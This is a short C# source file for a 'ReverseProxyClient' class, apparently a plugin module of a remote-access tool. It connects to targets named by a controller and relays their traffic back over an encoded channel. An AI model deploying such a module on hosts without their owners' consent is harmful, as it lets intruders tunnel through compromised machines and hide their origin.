using System;
using System.Net;
using System.Net.Sockets;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class ReverseProxyClient
{
	public const int BUFFER_SIZE = 1024;

	private byte[] _buffer;

	private bool _disconnectIsSend;

	public int ConnectionId { get; private set; }

	public Socket Handle { get; private set; }

	public string Target { get; private set; }

	public int Port { get; private set; }

	public ReverseProxyClient(int ConnectionId, string Target, int Port)
	{
		this.ConnectionId = ConnectionId;
		this.Target = Target;
		this.Port = Port;
		Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		Handle.BeginConnect(Target, Port, Handle_Connect, null);
	}

	private void Handle_Connect(IAsyncResult ar)
	{
		try
		{
			Handle.EndConnect(ar);
		}
		catch
		{
		}
		if (Handle.Connected)
		{
			try
			{
				_buffer = new byte[1024];
				Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
			}
			catch
			{
				Client.Send(LEB128.Write(new object[4] { "ReverseProxyR", "ConnectResponse", ConnectionId, false }));
				Disconnect();
			}
			IPEndPoint iPEndPoint = (IPEndPoint)Handle.LocalEndPoint;
			Client.Send(LEB128.Write(new object[7]
			{
				"ReverseProxyR",
				"ConnectResponse",
				ConnectionId,
				true,
				iPEndPoint.Address.GetAddressBytes(),
				iPEndPoint.Port,
				Target
			}));
		}
		else
		{
			Client.Send(LEB128.Write(new object[4] { "ReverseProxyR", "ConnectResponse", ConnectionId, false }));
		}
	}

	private void AsyncReceive(IAsyncResult ar)
	{
		try
		{
			int num = Handle.EndReceive(ar);
			if (num <= 0)
			{
				Disconnect();
				return;
			}
			byte[] array = new byte[num];
			Array.Copy(_buffer, array, num);
			Client.Send(LEB128.Write(new object[4] { "ReverseProxyR", "Data", ConnectionId, array }));
		}
		catch
		{
			Disconnect();
			return;
		}
		try
		{
			Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
		}
		catch
		{
			Disconnect();
		}
	}

	public void Disconnect()
	{
		if (!_disconnectIsSend)
		{
			_disconnectIsSend = true;
			Client.Send(LEB128.Write(new object[3] { "ReverseProxyR", "Disconnect", ConnectionId }));
		}
		try
		{
			Handle.Close();
		}
		catch
		{
		}
	}

	public void SendToTargetServer(byte[] data)
	{
		try
		{
			Handle.Send(data);
		}
		catch
		{
			Disconnect();
		}
	}
}
